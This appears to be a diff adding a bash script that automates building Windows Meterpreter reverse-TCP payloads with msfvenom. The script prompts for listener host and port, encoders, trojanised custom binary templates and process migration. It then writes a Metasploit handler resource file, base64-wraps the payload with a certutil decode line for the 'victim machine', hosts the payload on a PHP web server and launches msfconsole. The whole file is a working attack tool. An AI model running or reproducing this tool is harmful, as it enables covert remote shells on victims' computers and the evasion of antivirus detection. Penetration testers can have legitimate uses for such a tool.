@@ -1,0 +1,224 @@
+#!/bin/bash
+
+## Edited 16-08-2018
+
+echo MSFVenom Binary and Resource file Generator Script. Designed to work with Metasploit multi/handler stub.
+echo Generates WINDOWS BINARIES ONLY!!
+echo Press Ctrl-C at anytime to exit this script.
+
+function setpayload {
+#set payload options
+read -p "Enter Payload [windows/meterpreter/reverse_tcp]: " payload
+if [ -z "$payload" ] || [ "$payload" = 'windows/meterpreter/reverse_tcp' ]
+	then
+	payload='windows/meterpreter/reverse_tcp'
+fi
+read -p "Enter LHOST ["$(ifconfig | grep -A1 eth0 | grep inet | awk '{print $2}')"]: " lhost
+if [ -z "$lhost" ]
+	then
+	lhost="$(ifconfig | grep -A1 eth0 | grep inet | awk '{print $2}')"
+fi
+read -p "Enter LPORT [4444]: " lport
+if [ -z "$lport" ] || [ "$lport" = '4444' ]
+	then
+	lport=4444
+fi
+}
+
+
+function setprepend {
+# Set prepend options
+read -p "Enter PrependMigrate [false]: " prependmigrate
+if [ -z "$prependmigrate" ] || [ "$prependmigrate" = 'false' ]
+	then
+	prependmigrate='false'
+else
+	if [ "$prependmigrate" = 'true' ]
+		then
+		read -p "Enter PrependMigrateProc [explorer.exe]: " prependmigrateproc
+		if [ -z "$prependmigrateproc" ]
+			then
+			prependmigrateproc=explorer.exe
+		fi
+	fi
+fi
+if [ $prependmigrate = 'false' ]
+	then
+	advopt=''
+else
+	advopt="PrependMigrate=$prependmigrate PrependMigrateProc=$prependmigrateproc"
+fi
+}
+
+
+function setarch {
+# Set Arch
+read -p "Enter Architechure [x86]: " arch
+if [ -z "$arch" ] || [ "$arch" = 'x86' ]
+	then
+	arch='x86'
+fi
+}
+
+function setenc {
+# Set Encoder & iterations options
+echo Set Encoder. Accepted Encoders:
+msfvenom --list encoders
+#cat enc.txt
+read -p "Enter Encoder type [none]: " encoder
+if [ -z "$encoder" ] || [ "$encoder" = 'none' ]
+	then
+	encoder=''
+	iterations=''
+else
+	read -p "Enter Encode Iterations ["1"]: " iterations
+	if [ -z "$iterations" ]
+	then
+	iterations='1'
+	fi
+fi
+if [ -z "$encoder" ] && [ -z "$iterations"]
+	then
+	encopt=''
+else
+	encopt="-e $encoder -i $iterations"
+fi
+}
+
+function setcustbin {
+# Set Custom Binary option
+read -p "Use custom binary template? [no]: " custbin
+if [  -z "$custbin" ] || [ "$custbin" = 'no' ] || [ "$custbin" = 'n' ]
+	then
+	custbin=''
+	custbinpath=''
+else
+	if [ "$custbin" = 'yes' ] || [ "$custbin" = 'y' ]
+		then
+		read -p "Enter custom binary path: " custbinpath
+	fi
+fi
+if [ -z "$custbin" ] && [ -z "$custbinpath"]
+	then
+	custbinopt=''
+else
+	custbinopt="-x $custbinpath -k"
+fi
+}
+
+
+function setformat {
+# Set file format.. 
+echo Formats: dll,exe,ps1,vbs
+read -p "Set format [exe]: " format
+if [ -z "$format" ] || [ "$format" = 'exe' ]
+	then
+	format='exe'
+fi
+}
+
+function setoutput {
+# Set output options
+read -p "Set output location ["$(pwd)"]: " location
+if [ -z "$location" ] || [ "$location" = "$(pwd)" ]
+	then
+	location="$(pwd)"
+fi
+read -p "Set output filename [bin_output]: " filename
+if [ -z "$filename" ] || [ "$output" = 'bin_output' ]
+	then
+	filename='bin_output'
+fi
+}
+
+
+function genresfile {
+## Set resource file options
+read -p "Set resource filename [$filename]: " resfilename
+if [ -z "$resfilename" ] || [ "$resfilename" = "$filename" ]
+	then
+	resfilename='$filename'
+fi
+## Generate resource file
+echo Generating..
+echo use multi/handler > "$location/$resfilename.rc"
+echo set payload $payload >> "$location/$resfilename.rc"
+echo set lhost $lhost >> "$location/$resfilename.rc"
+echo set lport $lport >> "$location/$resfilename.rc"
+if [ $prependmigrate = 'true' ]
+	then
+	echo set PrependMigrate $prependmigrate >> "$location/$resfilename.rc"
+	echo set PrependMigrateProc $prependmigrateproc >> "$location/$resfilename.rc"
+fi
+echo run -j -z >> "$location/$resfilename.rc"
+}
+
+
+function genbinfile {
+## Generate binary
+echo DEBUG: msfvenom -a $arch --platform windows $custbinopt -p $payload LHOST=$lhost LPORT=$lport $advopt -f $format $encopt -o "$location/$filename.$format"
+msfvenom -a $arch --platform windows $custbinopt -p $payload LHOST=$lhost LPORT=$lport $advopt -f $format $encopt -o "$location/$filename.$format"
+}
+
+
+function encb64 {
+## encode additional base64 layer
+read -p "Encode with openssl Base64? [no]: " eb64
+if [ -z "$eb64" ] || [ "$eb64" = 'no' ] || [ "$eb64" = 'n' ]
+	then
+	eb64=''
+else
+	if [ "$eb64" = 'yes' ] || [ "$eb64" = 'y' ]
+		then
+		openssl enc -base64 -in "$location/$filename.$format" -out "$location/$filename.b64"
+		echo File is now encoded - Ensure the file is decoded before running in victim machine. Windows command to decode:
+		echo certutil -decode "$filename.b64" "decoded_$filename.$format"
+	fi
+fi
+}
+
+
+function hostsvr {
+## Host file on server
+read -p "Host file? [no]: " hsvr
+if [ -z "$hsvr" ] || [ "$hsvr" = 'no' ] || [ "$hsvr" = 'n' ]
+	then
+	hsvr=''
+else
+	if [ "$hsvr" = 'yes' ] || [ "$hsvr" = 'y' ]
+		then
+		nohup php -S 0.0.0.0:80 -t "$location" 2>&1 &
+		echo PHP Server has started. Download the file at "http://$(ifconfig | grep -A1 eth0 | grep inet | awk '{print $2}')/$filename.$format"
+	fi
+fi
+}
+
+
+function runmsfrc {
+## Run metasploit framework resource file
+read -p "Run resource file? [no]: " runrc
+if [ -z "$runrc" ] || [ "$runrc" = 'no' ] || [ "$runrc" = 'n' ]
+	then
+	runrc=''
+else
+	if [ "$runrc" = 'yes' ] || [ "$runrc" = 'y' ]
+		then
+		echo Loading "$location/$resfilename.rc"..
+		msfconsole -r "$location/$resfilename.rc"
+	fi
+fi
+}
+
+#run functions
+setpayload
+setprepend
+setarch
+setenc
+setcustbin
+setformat
+setoutput
+genresfile
+genbinfile
+encb64
+hostsvr
+runmsfrc
